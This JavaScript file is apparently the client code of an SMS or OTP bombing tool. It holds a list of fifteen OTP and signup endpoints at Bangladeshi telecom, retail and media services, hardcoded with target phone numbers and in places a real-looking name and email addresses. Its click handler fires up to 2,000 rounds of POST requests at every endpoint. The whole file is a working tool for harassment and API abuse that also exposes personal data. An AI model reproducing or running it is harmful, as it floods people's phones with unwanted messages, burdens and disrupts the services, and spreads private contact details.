const apis = [
  { url: "https://cokestudio23.sslwireless.com/api/store-and-send-otp", body: { msisdn: "8801316787742", name: "Aulad Hosen", email: "uladhosenridoy@gmail.com", dob: "2000-01-01", occupation: "N/A", gender: "male" } },
  { url: "https://cokestudio23.sslwireless.com/api/check-gp-number", body: { msisdn: "01738013571" } },
  { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: { msisdn: "01700605099" } },
  { url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: { mobile: "+88017086985099" } },
  { url: "https://api.osudpotro.com/api/v1/users/send_otp", body: { mobile: "+88-01616685690", deviceToken: "web", language: "en", os: "web" } },
  { url: "https://fundesh.com.bd/api/auth/generateOTP?service_key=", body: { msisdn: "1616685690" } },
  { url: "https://api.swap.com.bd/api/v1/send-otp", body: { phone: "01616685690" } },
  { url: "https://api.bd.airtel.com/v1/account/login/otp", body: { phone_number: "01616685690" } },
  { url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=017569889099", body: null },
  { url: "https://www.rokomari.com/otp/send?emailOrPhone=8801858629325&countryCode=BD", body: null },
  { url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=018868629325", body: null },
  { url: "https://m.cricbuzz.com/cbplus/auth/user/signup", body: { username: "ajajsjfhcj@gmail.com" } },
  { url: "https://api.paragonfood.com.bd/auth/customerlogin", body: { emailOrPhone: "ajajsjfhcj@gmail.com" } },
  { url: "https://prod-api.viewlift.com/identity/signup?site=prothomalo", body: { requestType: "send", phoneNumber: "+8801616685690", emailConsent: true, whatsappConsent: false } },
  { url: "https://app.eonbazar.com/api/auth/register", body: { mobile: "01616685690", name: "Hello", password: "helloq", email: "ajajsjfhcj@gmail.com" } }
];

document.getElementById("hitButton").addEventListener("click", async () => {
  const count = Math.min(parseInt(document.getElementById("hitCount").value), 2000);
  document.getElementById("status").innerText = `⏳ Sending ${count} requests to ${apis.length} APIs...`;

  for (let i = 0; i < count; i++) {
    for (const api of apis) {
      fetch(api.url, {
        method: "POST",
        mode: "no-cors",
        headers: { "Content-Type": "application/json" },
        body: api.body ? JSON.stringify(api.body) : null
      }).catch(() => {});
    }
  }
  document.getElementById("status").innerText = `✅ Done! Sent ${count} hits to ${apis.length} APIs.`;
});
